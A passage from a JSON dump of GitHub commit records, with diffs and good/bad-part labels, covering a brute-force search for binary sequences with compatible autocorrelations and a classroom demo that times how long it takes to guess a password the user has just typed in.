are_compatible_autocorrelation(seq_a, seq_b): compatible_sequence=(seq_a, seq_b) compatible_sequences.append(compatible_sequence) return compatible_sequences \"\"\" def brute_force_search_of_compatible_autocorrelations_1(n): correlation_to_sequence={ tuple(circular_correlation(seq, seq)): seq for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2)) } compatible_sequences=[] expected_addition=[n -1] +[(n -1) \/\/ 2] *(n -1) for correlation in correlation_to_sequence.keys(): expected_correlation=tuple( pointwise_operation(lambda x, y: x -y, expected_addition, correlation) ) if expected_correlation in correlation_to_sequence.keys(): compatible_sequence=( list(correlation_to_sequence[correlation]), list(correlation_to_sequence[expected_correlation]), ) compatible_sequences.append(compatible_sequence) return compatible_sequences \"\"\" def main(): print(\"Entry point for playing around\") n=11 compatible_sequences=brute_force_search_of_compatible_autocorrelations(n) for a, b in compatible_sequences: correlation_a=circular_correlation(a, a) correlation_b=circular_correlation(b, b) correlation_sum=pointwise_operation( lambda x, y: x +y, correlation_a, correlation_b ) print(f\"sequence a{a}, sequence b{b}, correlation sum{correlation_sum}\") if __name__==\"__main__\": main() ","sourceWithComments":"from dft_utils import psd\nfrom sequence_generation import (\n    seq_module_rotation_and_reversal,\n    seq_binary,\n    seq_n_choose_k,\n)\n\nfrom vector_utils import circular_correlation, pointwise_operation\n\n\ndef are_compatible_autocorrelation(a, b):\n    correlation_a = circular_correlation(a, a)\n    correlation_b = circular_correlation(b, b)\n    result = pointwise_operation(lambda x, y: x + y, correlation_a, correlation_b)\n    return all([result[1] == result[i] for i in range(1, len(result))])\n\n\ndef are_compatible_psd(a, b):\n    psd_a = psd(a)\n    psd_b = psd(b)\n    result = pointwise_operation(lambda x, y: x + y, psd_a, psd_b)\n    are_almost_equal = lambda x, y: abs(x - y) < 1e-10\n    return all([are_almost_equal(result[1], result[i]) for i in range(1, len(result))])\n\n\ndef brute_force_search_of_compatible_autocorrelations(n):\n    sequences_to_test = [\n        seq for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2))\n    ]\n\n    compatible_sequences = []\n    for seq_a in sequences_to_test:\n        for seq_b in sequences_to_test:\n            if are_compatible_autocorrelation(seq_a, seq_b):\n                compatible_sequence = (seq_a, seq_b)\n                compatible_sequences.append(compatible_sequence)\n\n    return compatible_sequences\n\n\n\"\"\"\ndef brute_force_search_of_compatible_autocorrelations_1(n):\n\n    correlation_to_sequence = {\n        tuple(circular_correlation(seq, seq)): seq\n        for seq in seq_module_rotation_and_reversal(seq_n_choose_k(n, n \/\/ 2))\n    }\n\n    compatible_sequences = []\n    expected_addition = [n - 1] + [(n - 1) \/\/ 2] * (n - 1)\n    for correlation in correlation_to_sequence.keys():\n        expected_correlation = tuple(\n            pointwise_operation(lambda x, y: x - y, expected_addition, correlation)\n        )\n        if expected_correlation in correlation_to_sequence.keys():\n            compatible_sequence = (\n                list(correlation_to_sequence[correlation]),\n                list(correlation_to_sequence[expected_correlation]),\n            )\n            compatible_sequences.append(compatible_sequence)\n\n    return compatible_sequences\n\"\"\"\n\n\ndef main():  # pragma: no cover\n    print(\"Entry point for playing around\")\n    n = 11\n    compatible_sequences = brute_force_search_of_compatible_autocorrelations(n)\n    for a, b in compatible_sequences:\n        correlation_a = circular_correlation(a, a)\n        correlation_b = circular_correlation(b, b)\n        correlation_sum = pointwise_operation(\n            lambda x, y: x + y, correlation_a, correlation_b\n        )\n        print(f\"sequence a {a}, sequence b {b}, correlation sum {correlation_sum}\")\n\n\nif __name__ == \"__main__\":  # pragma: no cover\n    main()\n"}},"msg":"improved but still not great brute force search"}},"https:\/\/github.com\/sokserey-hing\/git-python-52":{"98284397b4bb5c04c3ff2cd85e247edd8dba6d64":{"url":"https:\/\/api.github.com\/repos\/sokserey-hing\/git-python-52\/commits\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","html_url":"https:\/\/github.com\/sokserey-hing\/git-python-52\/commit\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","message":"remove cyan, improve brute_force","sha":"98284397b4bb5c04c3ff2cd85e247edd8dba6d64","keyword":"brute force improve","diff":"diff --git a\/m14_password_crack\/brute_force_cyan.py b\/m14_password_crack\/brute_force_cyan.py\ndeleted file mode 100644\nindex b2bdbea5..00000000\n--- a\/m14_password_crack\/brute_force_cyan.py\n+++ \/dev\/null\n@@ -1,31 +0,0 @@\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file\ndiff --git a\/m14_password_crack\/using_brute_force.py b\/m14_password_crack\/using_brute_force.py\nindex 42c46782..a938de40 100644\n--- a\/m14_password_crack\/using_brute_force.py\n+++ b\/m14_password_crack\/using_brute_force.py\n@@ -2,23 +2,30 @@\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n@@ -26,23 +33,21 @@ def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n@@ -51,11 +56,14 @@ def main():\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n@@ -63,8 +71,12 @@ def main():\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n@@ -75,15 +87,14 @@ def main():\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n@@ -98,9 +109,10 @@ def main():\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","files":{"\/m14_password_crack\/brute_force_cyan.py":{"changes":[{"diff":"\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file","add":0,"remove":31,"filename":"\/m14_password_crack\/brute_force_cyan.py","badparts":["import itertools","import time","def tryPassword(passwordSet, stringTypeSet):","    start = time.time()","    chars = stringTypeSet","    attempts = 0","    for i in range(1, 9):","        for letter in itertools.product(chars, repeat=i):","            attempts += 1","            letter = ''.join(letter)","            if letter == passwordSet:","                end = time.time()","                distance = end - start","                return (attempts, distance)","while True:","    password = input(\"Password:  \")","    if not password: break","    stringType = \"1234567890\"","    tries, timeAmount = tryPassword(password, stringType)","    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"],"goodparts":[]}],"source":"\n\nimport itertools import time def tryPassword(passwordSet, stringTypeSet): start=time.time() chars=stringTypeSet attempts=0 for i in range(1, 9): for letter in itertools.product(chars, repeat=i): attempts +=1 letter=''.join(letter) if letter==passwordSet: end=time.time() distance=end -start return(attempts, distance) while True: password=input(\"Password: \") if not password: break stringType=\"1234567890\" tries, timeAmount=tryPassword(password, stringType) print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" %(password, tries, timeAmount)) ","sourceWithComments":"# Imports\nimport itertools\nimport time\n\n\n# Brute force function\ndef tryPassword(passwordSet, stringTypeSet):\n    start = time.time()\n    chars = stringTypeSet\n    attempts = 0\n    for i in range(1, 9):\n        for letter in itertools.product(chars, repeat=i):\n            attempts += 1\n            letter = ''.join(letter)\n            if letter == passwordSet:\n                end = time.time()\n                distance = end - start\n                return (attempts, distance)\n\n\nwhile True:\n\n    password = input(\"Password:  \")\n    if not password: break\n\n    # Allowed characters\n    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n    stringType = \"1234567890\"\n    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n    tries, timeAmount = tryPassword(password, stringType)\n    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))"},"\/m14_password_crack\/using_brute_force.py":{"changes":[{"diff":"\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n","add":14,"remove":7,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")","parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")","import psutil","print(f\"number of cores: {psutil.cpu_count()}\")","        print(f\"oooo waiting for message\")","        print(f\"---> received message from queue: {check_info}\")"],"goodparts":["import psutil","import sys","parser = argparse.ArgumentParser(description=\"brute force password crack\")","parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")","parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")","parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")","parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")","numeric = args.numeric","alpha = args.alpha","special = args.special","        if \"exit\" in check_info:","            break"]},{"diff":"\n         actual_password = check_info[\"actual_password\"]\n \n         for next_chars in itertools.product(chars, repeat=pw_length-1):\n-            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n             test_password = first_char + ''.join(next_chars)\n+\n+            # sys.stdout.write(\"\\r\")\n+            # sys.stdout.write(f\"-- testing: {test_password}\")\n+\n             if test_password == actual_password:\n-                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n+                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})\n                 break\n \n             if not bf_terminate_queue.empty():\n-                print(f\"~~~~ [{first_char}] terminating as requested\")\n-                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n+                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n                 break\n \n         else:\n-            print(f\"---! [{first_char}] password not found\")\n-            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n-\n-        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n-        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n+            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})\n \n \n def main():\n","add":7,"remove":9,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})","                print(f\"~~~~ [{first_char}] terminating as requested\")","                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})","            print(f\"---! [{first_char}] password not found\")","            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})"],"goodparts":["                bf_response_queue.put({\"found\": True, \"pw\": actual_password, \"time\": time()})","                bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})","            bf_response_queue.put({\"found\": False, \"pw\": actual_password, \"time\": None})"]},{"diff":"\n     bf_response_queue = Queue()\n     bf_terminate_queue = Queue()\n \n-    chars = \"0123456789\"\n+    chars = \"\"\n+    if numeric: chars += \"0123456789\"\n+    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n+    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"\n \n+    print(f\"\\nsearch characters: {chars}\\n\")\n     bf_processes = list()\n     for proc_num in range(0, num_processes):\n-        print(f\"---> starting process number {proc_num}\")\n         proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n         proc.start()\n         print(f\"---> process number {proc_num} started\")\n","add":5,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["    chars = \"0123456789\"","        print(f\"---> starting process number {proc_num}\")"],"goodparts":["    chars = \"\"","    if numeric: chars += \"0123456789\"","    if alpha:   chars += \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"","    if special: chars += \"`~!@#$%^&*(_-+={[}]|\\\\:;\\\"\\'<,>.?\/\"","    print(f\"\\nsearch characters: {chars}\\n\")"]},{"diff":"\n \n     while True:\n \n-        password = input(\"Password:  \")\n-        if not password: exit()\n+        password = input(\"\\nPassword:  \")\n+        if not password:\n+            for _ in bf_processes:\n+                bf_request_queue.put({\"exit\": True})\n+            print(\"\\n... exiting brute force password finder\")\n+            break\n \n         time_start = time()\n         for char in chars:\n","add":6,"remove":2,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        password = input(\"Password:  \")","        if not password: exit()"],"goodparts":["        password = input(\"\\nPassword:  \")","        if not password:","            for _ in bf_processes:","                bf_request_queue.put({\"exit\": True})","            print(\"\\n... exiting brute force password finder\")","            break"]},{"diff":"\n             check_info[\"pw_length\"] = len(password)\n             check_info[\"actual_password\"] = password\n \n-            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n             bf_request_queue.put(check_info)\n \n         for _ in chars:\n             rsp_info = bf_response_queue.get()\n \n             if rsp_info[\"found\"]:\n-                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n-                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n+                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")\n+                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")\n                 break\n \n         else:\n","add":2,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["            print(f\"---> putting message for char: {char} onto queue: {check_info}\")","                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"found password in {rsp_info['time']-time_start:.3f}\")"],"goodparts":["                print(f\"\\n---> FOUND PASSWORD: {rsp_info['pw']}\")","                print(f\"   +---> found password in {rsp_info['time']-time_start:.3f}\")"]},{"diff":"\n             while not queue.empty():\n                 queue.get()\n \n-        print(f\"request: {bf_request_queue.qsize()}\")\n-        print(f\"response: {bf_response_queue.qsize()}\")\n-        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n+        print(\"\\nQueues:\")\n+        print(f\"-- request: {bf_request_queue.qsize()}\")\n+        print(f\"-- response: {bf_response_queue.qsize()}\")\n+        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")\n \n \n if __name__ == '__main__':\n","add":4,"remove":3,"filename":"\/m14_password_crack\/using_brute_force.py","badparts":["        print(f\"request: {bf_request_queue.qsize()}\")","        print(f\"response: {bf_response_queue.qsize()}\")","        print(f\"terminate: {bf_terminate_queue.qsize()}\")"],"goodparts":["        print(\"\\nQueues:\")","        print(f\"-- request: {bf_request_queue.qsize()}\")","        print(f\"-- response: {bf_response_queue.qsize()}\")","        print(f\"-- terminate: {bf_terminate_queue.qsize()}\")"]}],"source":"\nimport itertools from time import time, sleep import argparse from multiprocessing import Process, Queue parser=argparse.ArgumentParser(description=\"Number of processes for brute force\") parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\") args=parser.parse_args() num_processes=int(args.processes) import psutil print(f\"number of cores:{psutil.cpu_count()}\") def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue): while True: print(f\"oooo waiting for message\") check_info=bf_request_queue.get() print(f\"---> received message from queue:{check_info}\") first_char=check_info[\"first_char\"] chars=check_info[\"chars\"] pw_length=check_info[\"pw_length\"] actual_password=check_info[\"actual_password\"] for next_chars in itertools.product(chars, repeat=pw_length-1): test_password=first_char +''.join(next_chars) if test_password==actual_password: bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()}) break if not bf_terminate_queue.empty(): print(f\"~~~~[{first_char}] terminating as requested\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) break else: print(f\"---![{first_char}] password not found\") bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None}) def main(): bf_request_queue=Queue() bf_response_queue=Queue() bf_terminate_queue=Queue() chars=\"0123456789\" bf_processes=list() for proc_num in range(0, num_processes): print(f\"---> starting process number{proc_num}\") proc=Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue)) proc.start() print(f\"---> process number{proc_num} started\") bf_processes.append(proc) while True: password=input(\"Password: \") if not password: exit() time_start=time() for char in chars: check_info=dict() check_info[\"first_char\"]=char check_info[\"chars\"]=chars check_info[\"pw_length\"]=len(password) check_info[\"actual_password\"]=password print(f\"---> putting message for char:{char} onto queue:{check_info}\") bf_request_queue.put(check_info) for _ in chars: rsp_info=bf_response_queue.get() if rsp_info[\"found\"]: print(f\"---> FOUND PASSWORD:{rsp_info['pw']}\") print(f\"found password in{rsp_info['time']-time_start:.3f}\") break else: print(f\"---! PASSWORD NOT FOUND:{password}\") bf_terminate_queue.put({}) sleep(1) for queue in[bf_request_queue, bf_response_queue, bf_terminate_queue]: while not queue.empty(): queue.get() print(f\"request:{bf_request_queue.qsize()}\") print(f\"response:{bf_response_queue.qsize()}\") print(f\"terminate:{bf_terminate_queue.qsize()}\") if __name__=='__main__': main() ","sourceWithComments":"import itertools\nfrom time import time, sleep\nimport argparse\nfrom multiprocessing import Process, Queue\n\nparser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\nparser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\nargs = parser.parse_args()\nnum_processes = int(args.processes)\n\nimport psutil\nprint(f\"number of cores: {psutil.cpu_count()}\")\n\n\ndef check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n\n    while True:\n\n        print(f\"oooo waiting for message\")\n        check_info = bf_request_queue.get()\n        print(f\"---> received message from queue: {check_info}\")\n\n        first_char = check_info[\"first_char\"]\n        chars = check_info[\"chars\"]\n        pw_length = check_info[\"pw_length\"]\n        actual_password = check_info[\"actual_password\"]\n\n        for next_chars in itertools.product(chars, repeat=pw_length-1):\n            # print(f\"---> constructing password: {first_char} plus {next_chars}\")\n            test_password = first_char + ''.join(next_chars)\n            if test_password == actual_password:\n                bf_response_queue.put({\"found\": True, \"pw\": test_password, \"time\": time()})\n                break\n\n            if not bf_terminate_queue.empty():\n                print(f\"~~~~ [{first_char}] terminating as requested\")\n                bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n                break\n\n        else:\n            print(f\"---! [{first_char}] password not found\")\n            bf_response_queue.put({\"found\": False, \"pw\": test_password, \"time\": None})\n\n        # bf_response_queue.put({\"found\": False, \"pw\": \"\", \"time\": time()})\n        # print(f\"---! Unable to find password of length: {pw_length} starting with {first_char}\")\n\n\ndef main():\n\n    bf_request_queue = Queue()\n    bf_response_queue = Queue()\n    bf_terminate_queue = Queue()\n\n    chars = \"0123456789\"\n\n    bf_processes = list()\n    for proc_num in range(0, num_processes):\n        print(f\"---> starting process number {proc_num}\")\n        proc = Process(target=check_password, args=(bf_request_queue, bf_response_queue, bf_terminate_queue))\n        proc.start()\n        print(f\"---> process number {proc_num} started\")\n        bf_processes.append(proc)\n\n    while True:\n\n        password = input(\"Password:  \")\n        if not password: exit()\n\n        time_start = time()\n        for char in chars:\n\n            check_info = dict()\n            check_info[\"first_char\"] = char\n            check_info[\"chars\"] = chars\n            check_info[\"pw_length\"] = len(password)\n            check_info[\"actual_password\"] = password\n\n            print(f\"---> putting message for char: {char} onto queue: {check_info}\")\n            bf_request_queue.put(check_info)\n\n        for _ in chars:\n            rsp_info = bf_response_queue.get()\n\n            if rsp_info[\"found\"]:\n                print(f\"---> FOUND PASSWORD: {rsp_info['pw']}\")\n                print(f\"found password in {rsp_info['time']-time_start:.3f}\")\n                break\n\n        else:\n            print(f\"---! PASSWORD NOT FOUND: {password}\")\n\n        # put a single terminate message in the queue so all process see it and quit\n        bf_terminate_queue.put({})\n        sleep(1)\n\n        # clear out any excess messages in all the queues\n        for queue in [bf_request_queue, bf_response_queue, bf_terminate_queue]:\n            while not queue.empty():\n                queue.get()\n\n        print(f\"request: {bf_request_queue.qsize()}\")\n        print(f\"response: {bf_response_queue.qsize()}\")\n        print(f\"terminate: {bf_terminate_queue.qsize()}\")\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"remove cyan, improve brute_force"}},"https:\/\/github.com\/ensxu\/test-python-52":{"98284397b4bb5c04c3ff2cd85e247edd8dba6d64":{"url":"https:\/\/api.github.com\/repos\/ensxu\/test-python-52\/commits\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","html_url":"https:\/\/github.com\/ensxu\/test-python-52\/commit\/98284397b4bb5c04c3ff2cd85e247edd8dba6d64","message":"remove cyan, improve brute_force","sha":"98284397b4bb5c04c3ff2cd85e247edd8dba6d64","keyword":"brute force improve","diff":"diff --git a\/m14_password_crack\/brute_force_cyan.py b\/m14_password_crack\/brute_force_cyan.py\ndeleted file mode 100644\nindex b2bdbea5..00000000\n--- a\/m14_password_crack\/brute_force_cyan.py\n+++ \/dev\/null\n@@ -1,31 +0,0 @@\n-# Imports\n-import itertools\n-import time\n-\n-\n-# Brute force function\n-def tryPassword(passwordSet, stringTypeSet):\n-    start = time.time()\n-    chars = stringTypeSet\n-    attempts = 0\n-    for i in range(1, 9):\n-        for letter in itertools.product(chars, repeat=i):\n-            attempts += 1\n-            letter = ''.join(letter)\n-            if letter == passwordSet:\n-                end = time.time()\n-                distance = end - start\n-                return (attempts, distance)\n-\n-\n-while True:\n-\n-    password = input(\"Password:  \")\n-    if not password: break\n-\n-    # Allowed characters\n-    # stringType = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`~!@#$%^&*()_-+=[{]}|:;'\\\",<.>\/?\"\n-    stringType = \"1234567890\"\n-    # stringType = \"abcdefghijklmnopqrstuvwxyz\"\n-    tries, timeAmount = tryPassword(password, stringType)\n-    print(\"CyanCoding's BFPC cracked the password %s in %s tries and %s seconds!\" % (password, tries, timeAmount))\n\\ No newline at end of file\ndiff --git a\/m14_password_crack\/using_brute_force.py b\/m14_password_crack\/using_brute_force.py\nindex 42c46782..a938de40 100644\n--- a\/m14_password_crack\/using_brute_force.py\n+++ b\/m14_password_crack\/using_brute_force.py\n@@ -2,23 +2,30 @@\n from time import time, sleep\n import argparse\n from multiprocessing import Process, Queue\n+import psutil\n+import sys\n+\n+parser = argparse.ArgumentParser(description=\"brute force password crack\")\n+parser.add_argument(\"-P\", \"--processes\", default=psutil.cpu_count(), help=\"Number of processes to use\")\n+parser.add_argument(\"-N\", \"--numeric\", default=True, help=\"Whether to use numerics\", action=\"store_true\")\n+parser.add_argument(\"-A\", \"--alpha\", default=False, help=\"Whether to use alphabetic\", action=\"store_true\")\n+parser.add_argument(\"-S\", \"--special\", default=False, help=\"Whether to use special chars\", action=\"store_true\")\n \n-parser = argparse.ArgumentParser(description=\"Number of processes for brute force\")\n-parser.add_argument(\"-processes\", default=2, help=\"Number of processes to use\")\n args = parser.parse_args()\n num_processes = int(args.processes)\n-\n-import psutil\n-print(f\"number of cores: {psutil.cpu_count()}\")\n+numeric = args.numeric\n+alpha = args.alpha\n+special = args.special\n \n \n def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n \n     while True:\n \n-        print(f\"oooo waiting for message\")\n         check_info = bf_request_queue.get()\n-        print(f\"---> received message from queue: {check_info}\")\n+\n+        if \"exit\" in check_info:\n+            break\n \n         first_char = check_info[\"first_char\"]\n         chars = check_info[\"chars\"]\n@@ -26,23 +33,21 @@ def check_password(bf_request_queue, bf_response_queue, bf_terminate_queue):\n         actual_password = 